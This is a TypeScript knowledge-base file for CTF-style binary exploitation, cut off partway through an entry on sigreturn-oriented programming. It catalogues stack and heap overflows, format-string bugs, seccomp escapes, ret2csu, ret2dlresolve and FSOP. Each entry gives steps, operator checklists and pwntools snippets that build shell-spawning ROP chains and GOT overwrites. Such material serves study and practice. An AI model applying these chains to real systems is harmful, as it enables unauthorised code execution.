export interface ExploitationPath {
  name: string;
  description: string;
  steps: string[];
  tools: string[];
  codeSnippet?: string;
  applicableLibc?: string;
  references?: string[];
}

export interface TechniqueDetails {
  id: string;
  name: string;
  category: 'recon' | 'mitigation' | 'technique' | 'leaf';
  class: string;
  description: string;
  
  // Comprehensive preconditions
  preconditions: {
    summary: string;
    required: string[];
    detectionSteps: string[];
    offsetDiscovery?: {
      [key: string]: string;
    };
  };
  
  // Multiple exploitation paths
  exploitationPaths: ExploitationPath[];
  
  // Post-exploitation
  postconditions: {
    successIndicators: string[];
    artifacts: string[];
  };
  
  // Operator workflow
  operatorChecklist: string[];
  
  // Filtering tags
  vulnerabilityTypes: string[];
  
  // References and write-ups
  references: {
    tool?: string;
    url?: string;
    description?: string;
  }[];
  
  children?: string[];
}

// Core tools reference library
export const CORE_TOOLS = {
  checksec: 'Best all-in-one mitigation scanner',
  readelf: 'ELF headers, sections, dynamic entries, RELRO, PIE',
  objdump: 'Disassembly, symbol tables, GOT/PLT layout',
  file: 'Basic architecture & ELF type detection',
  pwndbg: 'Enriched GDB: vmmap, heap, canary, telescope',
  GEF: 'GDB Enhanced Features: heap-analysis-helper, pattern',
  PEDA: 'Pattern generation, searchmem, context',
  gdb: 'Base debugger',
  'radare2/rabin2': 'Fast static + dynamic analysis alternative',
  pwntools: 'Exploit framework: cyclic, flat, fit, ELF, ROP, tubes',
  ROPgadget: 'ROP chain gadget search',
  ropper: 'Alternative gadget finder (cleaner output)',
  one_gadget: 'Libc execve one-gadget finder',
  'libc-database': 'Offline libc version lookup by symbol offsets',
  'libc.rip': 'Online libc symbol resolver',
  'seccomp-tools': 'Dump & analyze seccomp BPF filters',
  ltrace: 'Library call tracer',
  strace: 'Syscall tracer',
  strings: 'Static string extraction',
  nm: 'Symbol table dump',
  ldd: 'Shared library dependency listing',
  strip: 'Symbol strip detection',
  'vmmap (pwndbg)': 'Runtime memory map with permissions',
};

export const PWN_KNOWLEDGE_BASE: Record<string, TechniqueDetails> = {
  stack_buffer_overflow: {
    id: 'stack_buffer_overflow',
    name: 'Stack-Based Buffer Overflow (SBOF)',
    category: 'technique',
    class: 'Memory Corruption',
    description: 'Exploits by overwriting stack buffers to redirect execution flow and achieve RCE',
    
    preconditions: {
      summary: 'A fixed-size stack buffer exists and user-controlled input is written into it without proper length validation.',
      required: [
        'Vulnerable input function: gets(), read() with oversized count, scanf("%s"), strcpy(), strcat(), fgets() with wrong size',
        'Target buffer allocated on stack frame (local variable)',
        'Input length controllable by attacker (minimum buffer_size + 8 bytes for 64-bit RIP overwrite)',
        'No stack canary OR canary value is leaked/bypassable',
        'NX disabled (for shellcode) OR ROP gadgets/ret2libc available',
        'ASLR known or leaked if PIE/libc addresses needed'
      ],
      detectionSteps: [
        'Run: checksec --file=./binary → note canary/NX/PIE/RELRO status',
        'In GDB: disas <vuln_function> → look for call to gets/read/scanf',
        'Use cyclic (pwntools) or pattern_create to determine exact offset to RIP',
        'Send cyclic(200) payload → examine crash → extract RIP overwrite offset'
      ],
      offsetDiscovery: {
        'pwntools': 'cyclic(200) → crash → cyclic_find(core.read(rsp, 4))',
        'pwndbg': 'cyclic 200 → run → cyclic -l $rsp',
        'GEF': 'pattern create 200 → run → pattern search $rsp',
        'PEDA': 'pattern create 200 → run → pattern search'
      }
    },
    
    exploitationPaths: [
      {
        name: 'ret2shellcode (NX disabled, no PIE or leak available)',
        description: 'Inject executable shellcode directly into the buffer and redirect execution to it',
        steps: [
          'Find writable+executable memory region (vmmap in pwndbg)',
          'Inject shellcode into the buffer or adjacent memory',
          'Overwrite RIP with buffer/shellcode address',
          'Use NOP sled (0x90) to increase hit probability'
        ],
        tools: ['pwntools (shellcraft, asm)', 'pwndbg vmmap', 'objdump -d', 'msfvenom'],
        codeSnippet: `shellcode = asm(shellcraft.sh())
padding = b'A' * offset
payload = shellcode.ljust(offset, b'\\x90') + p64(buf_addr)
p.send(payload)`,
        references: [
          { description: 'PwnTools Shellcraft Documentation' },
          { tool: 'msfvenom', description: 'Metasploit shellcode generator' }
        ]
      },
      {
        name: 'ret2libc (NX enabled, ASLR off or leak available)',
        description: 'Chain libc functions (system) with controlled arguments to spawn shell',
        steps: [
          'Find offset to RIP using cyclic pattern',
          'Locate "pop rdi; ret" gadget for first argument setup',
          'Find /bin/sh string in libc address space',
          'Build chain: pop_rdi → &"/bin/sh" → system()',
          'If ASLR: leak libc via puts(got_entry), compute base = leak - symbol_offset'
        ],
        tools: ['ROPgadget', 'ropper', 'pwntools ROP class', 'one_gadget', 'libc.rip', 'libc-database'],
        codeSnippet: `rop = ROP(libc)
sh_addr = next(libc.search(b'/bin/sh'))
rop.call('system', [sh_addr])
payload = b'A' * offset + rop.chain()
p.send(payload)`,
        applicableLibc: 'All versions',
        references: [
          { description: 'ret2libc attack technique', url: 'https://ctf101.org/binary-exploitation/return-oriented-programming/' },
          { tool: 'one_gadget', description: 'Single-gadget RCE finder for libc' }
        ]
      },
      {
        name: 'ret2plt (call PLT stub for information leak)',
        description: 'Leak libc base by calling puts(GOT_entry) to enable ASLR bypass',
        steps: [
          'Locate puts@plt or printf@plt in binary PLT section',
          'Call puts@plt with GOT entry address to leak libc address',
          'Compute libc base: base = leak - known_offset_in_libc',
          'Return to vulnerable function for second stage exploitation',
          'Execute final ROP chain with computed libc addresses'
        ],
        tools: ['pwntools ELF (elf.plt, elf.got)', 'ROPgadget', 'pwntools ROP', 'readelf'],
        references: [
          { description: 'Two-stage exploitation with information leaks' }
        ]
      },
      {
        name: 'ret2syscall / SROP (no libc available)',
        description: 'Direct syscall gadgets or signal frame manipulation for RCE without libc',
        steps: [
          'Find "syscall; ret" and "pop rax; ret" gadgets via ROPgadget',
          'Set rax=59 (execve), rdi=&"/bin/sh", rsi=0, rdx=0',
          'Alternatively: trigger SIGSEGV → use sigreturn syscall to craft fake signal frame',
          'SROP can bypass restrictions where function calls are filtered'
        ],
        tools: ['ROPgadget', 'ropper', 'pwntools SigreturnFrame'],
        applicableLibc: 'Stripped binaries or libc unavailable',
        references: [
          { description: 'SROP: Exploiting the Processor using Signals' }
        ]
      }
    ],
    
    postconditions: {
      successIndicators: [
        'RIP/EIP register controlled and redirected to attacker payload',
        'Shell spawned (interactive or reverse shell)',
        'Arbitrary code execution achieved with target process privileges'
      ],
      artifacts: [
        'Core dump showing controlled instruction pointer',
        'Shell session with target user privileges',
        'Flag file read in CTF context'
      ]
    },
    
    operatorChecklist: [
      '[ ] Run checksec → record canary/NX/PIE/RELRO status',
      '[ ] Identify vulnerable function via disassembly (objdump / GDB)',
      '[ ] Calculate exact RIP offset using cyclic payload + crash analysis',
      '[ ] Determine exploitation path based on protections (ASLR, canary, NX)',
      '[ ] Find required ROP gadgets (ROPgadget / ropper)',
      '[ ] Identify libc version if needed (ldd, libc.rip, one_gadget)',
      '[ ] Craft pwntools exploit script with correct padding + ROP chain',
      '[ ] Test locally with ASLR disabled (echo 0 > /proc/sys/kernel/randomize_va_space)',
      '[ ] If ASLR enabled: leak addresses → recompute offsets dynamically',
      '[ ] Test against remote target with correct libc version matched'
    ],
    
    vulnerabilityTypes: ['stack', 'buffer'],
    
    references: [
      { tool: 'pwntools', description: 'Python exploitation framework' },
      { tool: 'pwndbg', description: 'Enhanced GDB plugin for exploit development', url: 'https://github.com/pwndbg/pwndbg' },
      { tool: 'ROPgadget', description: 'ROP chain gadget search utility' },
      { description: 'CTF101: Binary Exploitation', url: 'https://ctf101.org/binary-exploitation/' }
    ]
  },

  format_string_vulnerability: {
    id: 'format_string_vulnerability',
    name: 'Format String Vulnerability (FSB)',
    category: 'technique',
    class: 'Format String Exploitation',
    description: 'User-controlled data passed directly as format string to printf/fprintf enabling arbitrary read/write',
    
    preconditions: {
      summary: 'User-controlled data is passed directly as the format string argument to printf, fprintf, sprintf, etc.',
      required: [
        'printf(user_input) instead of printf("%s", user_input)',
        'Attacker controls the format string content completely',
        'Binary must be running (FSB is runtime-only attack)',
        'Stack readable: %p/%x chains can dump stack contents',
        'Write primitive: %n, %hn, %hhn available (usually not restricted on Linux)'
      ],
      detectionSteps: [
        'Send "%p.%p.%p.%p.%p.%p.%p.%p" — if addresses print back, FSB confirmed',
        'Send "%7$p" to read specific stack argument by index',
        'Send AAAA.%p.%p... to locate where input appears on stack (offset discovery)',
        'In GDB: set breakpoint at printf, inspect rsi/rdx/... (format arg registers)'
      ],
      offsetDiscovery: {
        'manual': 'Send "AAAA" + ".%p"*N until 0x41414141 appears in output',
        'pwntools': 'for i in range(1,50): p.sendline(f"%{i}$p"); leak = p.recvline()'
      }
    },
    
    exploitationPaths: [
      {
        name: 'Arbitrary Read (info-leak)',
        description: 'Leak sensitive data from stack/memory (canary, PIE base, libc base)',
        steps: [
          'Use %<N>$p or %<N>$s to read N-th printf argument position',
          'Target: stack canary (usually at fixed offset from format string on stack)',
          'Target: saved RIP on stack → compute binary base (if PIE)',
          'Target: libc function pointer on stack → compute libc base',
          'Chain leaks: canary + PIE + libc for multi-stage exploitation'
        ],
        tools: ['pwntools fmtstr_payload', 'manual %N$p probing', 'pwndbg telescope'],
        codeSnippet: `for i in range(1, 20):
    p.sendline(f'%{i}$p')
    leak = p.recvline()
    if b'0x' in leak:
        print(f'Position {i}: {leak}')`,
        references: [
          { description: 'Format String Vulnerability - CTF101', url: 'https://ctf101.org/binary-exploitation/format-string/' }
        ]
      },
      {
        name: 'Arbitrary Write via %n',
        description: 'Overwrite memory locations (GOT, hooks, return addresses)',
        steps: [
          'Use %<value>c%<N>$n to write "value" bytes count to address at position N',
          '%n writes 4 bytes (int), %hn writes 2 bytes, %hhn writes 1 byte (most precise)',
          'Common targets: GOT entry of called function, return address, __malloc_hook, __exit_funcs',
          'Pad with %c.%c... to reach desired byte count before %n'
        ],
        tools: ['pwntools fmtstr_payload(offset, {target: value})', 'manual calculation', 'pwndbg got command'],
        codeSnippet: `# Write 0x1234 to GOT entry at position 6
payload = fmtstr_payload(6, {got_addr: system_addr}, numbwritten=0)
p.sendline(payload)`,
        applicableLibc: 'Most versions; hooks removed in libc 2.34+',
        references: [
          { description: 'House of Spirit via Format String' }
        ]
      },
      {
        name: 'Canary Leak + Stack Overflow (combined attack)',
        description: 'Use FSB to leak canary, then perform SBOF with correct canary value',
        steps: [
          'Leak canary via %<N>$p at known canary stack offset',
          'Leak PIE base via saved RIP if needed',
          'Leak libc via stored pointer if needed',
          'Trigger buffer overflow with correct canary spliced into payload',
          'Combine SBOF and FSB for maximum bypass coverage'
        ],
        tools: ['pwntools', 'pwndbg canary command'],
        references: [
          { description: 'Multi-layer exploit techniques' }
        ]
      }
    ],
    
    postconditions: {
      successIndicators: [
        'Arbitrary memory read confirmed (addresses printed back)',
        'Target memory location overwritten with attacker-controlled value',
        'Control flow redirected (GOT hijack, return address overwrite)',
        'Shell obtained or flag read via modified function pointer'
      ],
      artifacts: [
        'Leaked canary/PIE/libc values in exploit output',
        'Overwritten GOT verified via pwndbg "got" command',
        'Shell session obtained'
      ]
    },
    
    operatorChecklist: [
      '[ ] Confirm FSB: send "%p.%p.%p" and verify address leak from output',
      '[ ] Discover format string stack offset (where input appears as printf argument)',
      '[ ] Leak canary if checksec shows canary=yes (CRITICAL)',
      '[ ] Leak PIE base if PIE enabled via saved RIP on stack',
      '[ ] Leak libc base via GOT pointer on stack or %s GOT read',
      '[ ] Identify write target based on RELRO status (GOT, hook, ret addr)',
      '[ ] Use pwntools fmtstr_payload() or craft manual %<N>$<width>hhn chain',
      '[ ] Verify write in local GDB before sending to remote',
      '[ ] Trigger overwritten function to execute payload (shell/one_gadget)'
    ],
    
    vulnerabilityTypes: ['format'],
    
    references: [
      { tool: 'pwntools', description: 'fmtstr_payload for automated FSB exploitation' },
      { description: 'Format String Attack - Wikipedia', url: 'https://en.wikipedia.org/wiki/Printf_format_string_attack' },
      { description: 'Format String Vulnerability Exploitation', url: 'https://ctf101.org/binary-exploitation/format-string/' }
    ]
  },

  heap_buffer_overflow: {
    id: 'heap_buffer_overflow',
    name: 'Heap Buffer Overflow',
    category: 'technique',
    class: 'Heap Exploitation',
    description: 'Overflow heap-allocated chunks to corrupt metadata or adjacent objects',
    
    preconditions: {
      summary: 'Data written to heap-allocated chunk overflows into adjacent chunk metadata or data, corrupting allocator structures',
      required: [
        'Heap allocation (malloc/calloc/realloc/new) used for user data',
        'Input written without size check, allowing overflow into next chunk header',
        'Attacker controls overflow length and content',
        'malloc version determines available techniques (check via: strings libc.so | grep GNU C)'
      ],
      detectionSteps: [
        'In GDB: heap (pwndbg) → inspect chunk layout',
        'Send large input to heap-stored buffer → check if next chunk prev_size/size corrupted',
        'Trigger free() after overflow → "corrupted double-linked list" indicates successful write',
        'Use pwndbg "vis_heap_chunks" for visual chunk layout and metadata'
      ],
      offsetDiscovery: {
        'pwndbg': 'heap → chunks → identify target chunk size field offset',
        'manual': 'Calculate: buffer_size + 16 (chunk header size) = overflow trigger point'
      }
    },
    
    exploitationPaths: [
      {
        name: 'fastbin dup / tcache dup (double free)',
        description: 'Free same chunk twice to create overlapping allocations',
        steps: [
          'Free same chunk twice → chunk appears twice in bin',
          'Allocate twice to get overlapping chunks with controlled content',
          'Overwrite fd pointer to target address (use safe-linking XOR if needed)',
          'Allocate until fake chunk returned at target address',
          'Write controlled payload to arbitrary memory'
        ],
        tools: ['pwndbg bins', 'pwntools malloc_chunk parsing'],
        applicableLibc: '< 2.26 for fastbin; tcache dup in 2.26-2.28 (no key check)',
        codeSnippet: `free(chunk)  # First free
free(chunk)  # Double free → chunk in bin twice
malloc(size) # Allocate → get original chunk
malloc(size) # Allocate → get chunk with corrupted fd`,
        references: [
          { description: 'How2Heap: fastbin_dup', url: 'https://github.com/shellphish/how2heap' }
        ]
      },
      {
        name: 'tcache poisoning (libc 2.26+)',
        description: 'Corrupt tcache bin to allocate at arbitrary address',
        steps: [
          'Free chunk into tcache',
          'Overflow into tcache entry and corrupt fd pointer to &target - 0x10',
          'Allocate twice: first returns original chunk, second returns fake chunk at target',
          'Write controlled data to arbitrary address (libc 2.32+ requires safe-linking bypass)',
          'For safe-linking (2.32+): fd_stored = (chunk_addr >> 12) XOR target'
        ],
        tools: ['pwndbg bins', 'pwndbg vis_heap_chunks', 'pwntools'],
        applicableLibc: '2.26 to 2.31 (no safe-linking); 2.32+ with safe-linking',
        references: [
          { description: 'How2Heap: tcache_poisoning' },
          { description: 'Safe-linking in glibc', url: 'https://www.qualys.com/2019/12/18/cve-2019-19363.txt' }
        ]
      },
      {
        name: 'House of Force (libc < 2.29)',
        description: 'Corrupt top chunk size to allocate at arbitrary address',
        steps: [
          'Overflow into top chunk size field, set to 0xffffffffffffffff',
          'Allocate large chunk with calculated size to advance top pointer to target',
          'Next allocation returns chunk at target address',
          'Write controlled data to target via standard malloc/free workflow'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        applicableLibc: '< 2.29',
        references: [
          { description: 'House of Force technique' }
        ]
      }
    ],
    
    postconditions: {
      successIndicators: [
        'Heap chunk metadata corrupted (size/fd/bk fields)',
        'Arbitrary allocation primitive achieved',
        'Write/read to controlled memory location',
        'Code execution via __malloc_hook or similar'
      ],
      artifacts: [
        'pwndbg "heap" command shows corrupted chunk',
        'Successful allocation at target address',
        'Shell session'
      ]
    },
    
    operatorChecklist: [
      '[ ] Identify heap allocation and overflow vector',
      '[ ] Run checksec → note libc version (determines applicable techniques)',
      '[ ] In GDB: heap → vis_heap_chunks → understand target chunk layout',
      '[ ] Determine libc version (ldd, strings, or libc.rip)',
      '[ ] Select exploitation path (fastbin/tcache/House of Force based on version)',
      '[ ] Craft overflow payload to corrupt target metadata field',
      '[ ] Test locally: trigger malloc → verify arbitrary address allocation',
      '[ ] For safe-linking bypass: leak heap address first',
      '[ ] Write payload to allocated target address',
      '[ ] Trigger code execution via overwritten hook or function pointer'
    ],
    
    vulnerabilityTypes: ['heap'],
    
    references: [
      { tool: 'how2heap', description: 'Heap exploitation techniques repository', url: 'https://github.com/shellphish/how2heap' },
      { tool: 'pwndbg', description: 'heap command for visualizing malloc structures' },
      { description: 'Heap Exploitation CTF101', url: 'https://ctf101.org/binary-exploitation/heap/' }
    ]
  },

  sandbox_escape: {
    id: 'sandbox_escape',
    name: 'Sandbox / Seccomp Escape',
    category: 'technique',
    class: 'Sandbox Bypass',
    description: 'Bypass seccomp filters and sandboxes to achieve code execution',
    
    preconditions: {
      summary: 'Process is restricted by seccomp BPF filter limiting available syscalls',
      required: [
        'seccomp-bpf filter installed via prctl(PR_SET_SECCOMP)',
        'Attacker must determine allowed syscalls (dump via seccomp-tools)',
        'Standard execution syscalls (execve) typically blocked',
        'Often allows: open, read, write, exit (ORW techniques)',
        'File descriptors may be pre-opened or seekable'
      ],
      detectionSteps: [
        'Run: seccomp-tools dump ./binary → inspect BPF rules',
        'Run: strace ./binary 2>&1 | grep -E "prctl|seccomp"',
        'Attempt execve syscall → SIGSYS signal indicates blocked',
        'Check available syscalls via seccomp-tools output'
      ]
    },
    
    exploitationPaths: [
      {
        name: 'ORW (open/read/write) chain',
        description: 'Read flag file using open/read/write syscalls instead of execve',
        steps: [
          'Identify allowed syscalls: typically open(2), read(3), write(4)',
          'Build ROP chain: open(flag_path) → read(fd, buf, 0x100) → write(1, buf, 0x100)',
          'Flag content written to stdout, readable to attacker',
          'Chain each syscall with proper argument registers (rax, rdi, rsi, rdx)'
        ],
        tools: ['ROPgadget', 'pwntools SigreturnFrame', 'seccomp-tools'],
        codeSnippet: `rop = ROP(binary)
rop(rax=2)  # open syscall
rop(rdi=flag_addr, rsi=0, rdx=0)  # filename, O_RDONLY, 0
rop(syscall)
# ... repeat for read(3) and write(4)`,
        references: [
          { description: 'ORW technique for sandboxed exploitation' }
        ]
      },
      {
        name: 'Seccomp filter bypass (vulnerable policies)',
        description: 'Exploit logical flaws in BPF filter rules',
        steps: [
          'Analyze seccomp-tools output for logical gaps',
          'Some filters allow execve but block execveat, or vice versa',
          'Some allow clone but block fork (or similar variant syscalls)',
          'Craft chain using allowed variant syscall',
          'Test each variant systematically'
        ],
        tools: ['seccomp-tools', 'ltrace', 'strace'],
        references: [
          { description: 'Seccomp bypass via logical flaws' }
        ]
      }
    ],
    
    postconditions: {
      successIndicators: [
        'Seccomp SIGSYS no longer triggered for required syscalls',
        'Flag file read and output captured',
        'Code execution achieved within sandbox constraints'
      ],
      artifacts: [
        'Flag content in stdout/stderr',
        'seccomp-tools dump showing allowed syscalls',
        'ORW ROP chain execution confirmed'
      ]
    },
    
    operatorChecklist: [
      '[ ] Run seccomp-tools dump → document allowed syscalls',
      '[ ] Identify if execve is available (usually not in CTF)',
      '[ ] If blocked: design ORW chain (open/read/write)',
      '[ ] Find gadgets: syscall, pop rax, pop rdi, pop rsi, pop rdx',
      '[ ] Build ROP chain: open(flag) → read(fd,buf,size) → write(1,buf,size)',
      '[ ] Verify each syscall number (rax=2 open, 3 read, 4 write)',
      '[ ] Test locally: confirm flag readable via stdout',
      '[ ] Alternative: check for execveat, execve with args, clone variants',
      '[ ] Send exploit to remote target'
    ],
    
    vulnerabilityTypes: ['sandbox'],
    
    references: [
      { tool: 'seccomp-tools', description: 'Dump and analyze seccomp BPF filters', url: 'https://github.com/david942j/seccomp-tools' },
      { description: 'Seccomp Exploitation Techniques', url: 'https://lkmidas.github.io/posts/20210105-seccomp/' },
      { tool: 'pwntools', description: 'ROP gadget chaining for syscall automation' }
    ]
  },

  ret2csu: {
    id: 'ret2csu',
    name: 'Ret2csu (Return-to-csu)',
    category: 'technique',
    class: 'ret2csu',
    description: 'A ROP technique that uses the universally available __libc_csu_init gadgets in dynamically linked x64 ELF binaries to populate RDX, RSI, RDI, and call an arbitrary function pointer. Extremely useful when standard pop rdx/rsi/rdi gadgets are missing.',
    preconditions: {
      summary: 'Dynamically linked x64 ELF binary with a buffer overflow, lacking standard ROP gadgets (specifically pop rdx).',
      required: [
        'Buffer overflow allowing RIP control',
        'x64 dynamically linked ELF binary',
        '__libc_csu_init function present in the binary (typically present by default in gcc up to ~v11)'
      ],
      detectionSteps: [
        'Run `objdump -d binary | grep __libc_csu_init` to verify existence',
        'Use ROPgadget or ropper to search for `pop rdx`. If none exist, ret2csu is a strong candidate.'
      ]
    },
    exploitationPaths: [
      {
        name: 'Standard ret2csu sequence',
        description: 'Execute the two-stage gadget from __libc_csu_init to call a function with 3 controlled arguments.',
        steps: [
          'Locate the two gadgets in __libc_csu_init (Gadget 1: pop rbx, rbp, r12, r13, r14, r15; Gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]).',
          'Chain Gadget 1 to setup registers: rbx=0, rbp=1, r12=function_ptr, r13=arg1(rdi), r14=arg2(rsi), r15=arg3(rdx).',
          'Chain into Gadget 2. It will set rdx, rsi, rdi, and call [r12].',
          'Since rbx=0 and rbp=1, the subsequent cmp and jne will fall through, popping 7 values (add rsp, 8 and 6 pops).',
          'Pad the ROP chain with 7 * 8 = 56 bytes of junk, then place the next ROP gadget address.'
        ],
        tools: ['ropper', 'pwndbg', 'pwntools'],
        codeSnippet: `def ret2csu(func_ptr, arg1, arg2, arg3):
    # csu_gadget_1: pop rbx, rbp, r12, r13, r14, r15, ret
    # csu_gadget_2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
    payload = p64(csu_gadget_1)
    payload += p64(0)          # rbx = 0
    payload += p64(1)          # rbp = 1
    payload += p64(func_ptr)   # r12 = pointer to function to call
    payload += p64(arg1)       # r13 -> rdi
    payload += p64(arg2)       # r14 -> rsi
    payload += p64(arg3)       # r15 -> rdx
    payload += p64(csu_gadget_2)
    payload += b'JUNKJUNK' * 7 # padding for the pops after call
    return payload`
      }
    ],
    postconditions: {
      successIndicators: ['Target function executed with correct 3 arguments'],
      artifacts: ['Stack state shifted by 56 bytes post-execution']
    },
    operatorChecklist: [
      '[ ] Verify __libc_csu_init exists (not present in very recent gcc versions)',
      '[ ] Find Gadget 1 (pops) and Gadget 2 (movs and call)',
      '[ ] Identify a pointer to the function you want to call (r12 must point to a POINTER to the function, e.g., a GOT entry)',
      '[ ] Build the chain setting rbx=0, rbp=1',
      '[ ] Account for the 56 bytes of junk after the gadget completes'
    ],
    vulnerabilityTypes: ['stack', 'rop'],
    references: [
      { description: 'Return-to-csu (ret2csu) tutorial', url: 'https://ropemporium.com/guide.html' }
    ]
  },

  ret2dlresolve: {
    id: 'ret2dlresolve',
    name: 'Return-to-dl-resolve',
    category: 'technique',
    class: 'ret2dlresolve',
    description: 'A technique that exploits the lazy binding mechanism of the dynamic linker (_dl_runtime_resolve). By forging Elf32_Rel/Elf64_Rela, Elf32_Sym/Elf64_Sym, and string table entries in memory, an attacker forces the dynamic linker to resolve and execute an arbitrary function (like system) instead of a legitimate one, all without needing a libc leak.',
    preconditions: {
      summary: 'Dynamically linked ELF binary with NO RELRO or Partial RELRO, and a buffer overflow large enough to hold forged structures.',
      required: [
        'Buffer overflow allowing RIP control and significant payload space (>100 bytes)',
        'Known writable memory area at a fixed address (to place forged structures)',
        'Partial RELRO or No RELRO (Full RELRO resolves all symbols at startup, removing _dl_runtime_resolve)'
      ],
      detectionSteps: [
        'Run `checksec` to verify RELRO (must not be Full)',
        'Run `checksec` to verify PIE (typically needs No PIE to have a known writable address like .bss)'
      ]
    },
    exploitationPaths: [
      {
        name: 'Forging dynamic linker structures (32-bit/64-bit)',
        description: 'Forge Reloc, Sym, and StrTab entries to trick _dl_runtime_resolve into resolving system().',
        steps: [
          'Identify the address of the PLT0 entry (pushes link_map and jumps to _dl_runtime_resolve).',
          'Calculate the reloc_offset such that .rel.plt + reloc_offset points to your forged Reloc structure in writable memory.',
          'Forge a Reloc structure. Its r_info field must contain a sym_offset pointing to your forged Symbol structure.',
          'Forge a Symbol structure. Its st_name field must contain a string offset pointing to the string "system" in your forged string table.',
          'Build ROP chain: push arg1 (e.g., "/bin/sh" address), jump to PLT0, push reloc_offset.',
          'The dynamic linker will read your forged structures, resolve "system", and execute it with your argument.'
        ],
        tools: ['pwntools (Ret2dlresolvePayload)', 'readelf'],
        codeSnippet: `// Using pwntools simplifies this massively:
elf = ELF('./binary')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr) # read payload into bss
rop.ret2dlresolve(dlresolve)     # trigger dl_resolve
payload = fit({ offset: rop.chain() })
io.sendline(payload)
io.sendline(dlresolve.payload)`
      }
    ],
    postconditions: {
      successIndicators: ['system("/bin/sh") executed without leaking libc'],
      artifacts: ['Forged ELF structures in .bss or other writable section']
    },
    operatorChecklist: [
      '[ ] Verify binary is dynamically linked and NOT Full RELRO',
      '[ ] Find a known, writable memory address (e.g., end of .bss)',
      '[ ] Calculate offsets for Reloc, Sym, and StrTab',
      '[ ] Ensure no bad characters in offsets if input is string-based',
      '[ ] Forge the payload (highly recommend using pwntools Ret2dlresolvePayload)',
      '[ ] Execute ROP chain to trigger PLT0 with forged reloc_offset'
    ],
    vulnerabilityTypes: ['stack', 'rop', 'dynamic-linking'],
    references: [
      { tool: 'pwntools Ret2dlresolvePayload', url: 'https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html' }
    ]
  },

  fsop_exploit: {
    id: 'fsop_exploit',
    name: 'File Stream Oriented Programming (FSOP)',
    category: 'technique',
    class: 'fsop',
    description: 'Exploitation technique that corrupts the internal fields and vtables of glibc _IO_FILE structures (like stdin, stdout, stderr, or dynamically opened files). By modifying the _IO_jump_t vtable or internal pointers, attackers can hijack control flow when file stream operations (like fread, fwrite, or exit/abort flushing) occur.',
    preconditions: {
      summary: 'Ability to overwrite a _IO_FILE structure in memory (e.g., via heap overflow, UAF, or arbitrary write).',
      required: [
        'Memory corruption primitive targeting the heap (where dynamic files live) or libc data section (where stdout/stderr live)',
        'Knowledge of glibc version (critical for vtable mitigation bypasses)'
      ],
      detectionSteps: [
        'Identify arbitrary write or heap overflow',
        'Check if binary uses file operations or if you can trigger exit()/abort() which flushes all open streams via _IO_list_all'
      ]
    },
    exploitationPaths: [
      {
        name: 'Classic FSOP (glibc < 2.24)',
        description: 'Directly overwrite the vtable pointer of a _IO_FILE structure.',
        steps: [
          'Overwrite the _IO_FILE structure in memory.',
          'Set the vtable pointer (at the end of the struct) to point to a forged vtable in memory you control.',
          'Place the address of system() or a one_gadget at the offset of the function that will be called (e.g., _IO_file_overflow).',
          'Trigger a stream operation or exit().'
        ],
        tools: ['pwndbg', 'pwntools']
      },
      {
        name: 'vtable Mitigation Bypass (House of Apple / wide data)',
        description: 'Exploit newer glibc versions (2.24+) that validate vtables against the read-only __libc_IO_vtables section.',
        steps: [
          'Since you cannot point the vtable to your own forged table, point it to an existing but differently purposed vtable within the valid section (e.g., _IO_wstr_jumps).',
          'Forge the _wide_data structure pointer within the _IO_FILE to point to controlled memory.',
          'When a wide-character operation is triggered, the execution will follow the pointers in your forged _wide_data struct, eventually calling an arbitrary function.'
        ],
        tools: ['pwndbg', 'pwntools', 'GDB']
      }
    ],
    postconditions: {
      successIndicators: ['Control flow hijacked during I/O operation or exit()'],
      artifacts: ['Corrupted _IO_FILE structures in libc or heap']
    },
    operatorChecklist: [
      '[ ] Determine glibc version to identify active vtable mitigations',
      '[ ] Identify which _IO_FILE to corrupt (stdout, stderr, or heap file)',
      '[ ] Setup the forged structure with correct magic numbers and flags to bypass initial validation checks',
      '[ ] Setup the forged vtable or wide_data structure',
      '[ ] Trigger the flush or operation (e.g., via return from main, abort(), or puts())'
    ],
    vulnerabilityTypes: ['heap', 'arbitrary-write', 'fsop'],
    references: [
      { description: 'FSOP Introduction', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/io_file/fsop/' },
      { description: 'House of Apple', url: 'https://bbs.kanxue.com/thread-273832.htm' }
    ]
  },

  srop: {
    id: 'srop',
    name: 'Sigreturn Oriented Programming (SROP)',
    category: 'technique',
    class: 'srop',
    description: 'Fakes a signal frame on the stack to set all registers simultaneously via the rt_sigreturn syscall (15 on x86_64), enabling powerful one-shot ROP chains without chaining individual gadgets.',

    preconditions: {
      summary: 'A buffer overflow large enough to hold a signal frame (minimum ~248 bytes on x86_64), plus a syscall; ret gadget to invoke rt_sigreturn.',
      required: [
        'Buffer overflow providing at least ~248 bytes of controllable stack space (SignalFrameStruct size + padding)',
        'A "syscall; ret" gadget (or "syscall" followed by any benign instruction, since rt_sigreturn does not return normally)',
        'Ability to set RAX to 15 (sigreturn syscall number) — usually via a "pop rax; ret" gadget',
        'Stack must be writable (signal frame must be readable by kernel during rt_sigreturn)',
        'No seccomp filter blocking the sigreturn syscall'
      ],
      detectionSteps: [
        'Run: ROPgadget --binary ./binary | grep ": syscall" to find syscall gadgets',
        'Run: ROPgadget --binary ./binary | grep "pop rax" to ensure RAX control',
        'Check: seccomp-tools dump ./binary to verify rt_sigreturn (syscall 15) is allowed',
        'Calculate required overflow space: 0xf8 (x86_64 frame header) + 0x80 (registers) = 0x178 bytes minimum'
      ],
      offsetDiscovery: {
        'pwntools': 'frame = SigreturnFrame() → set registers → frame.bytes()',
        'manual': 'Layout: uc_flags(8) + uc_link(8) + ss_sp(8) + ss_flags(8) + ss_size(8) + r8-r15(64) + rdi-r15(64) + trampoline + rsp+rip fields'
      }
    },

    exploitationPaths: [
      {
        name: 'SROP → execve("/bin/sh")',
        description: 'Craft a sigreturn frame that sets rax=59 (execve), rdi=&"/bin/sh", rsi=0, rdx=0, rip=syscall.',
        steps: [
          'Find a "pop rax; ret" gadget and a "syscall; ret" gadget via ROPgadget/ropper',
          'Create SigreturnFrame: rax=59, rdi=address_of_binsh, rsi=0, rdx=0, rip=syscall_gadget, rsp=any_writable',
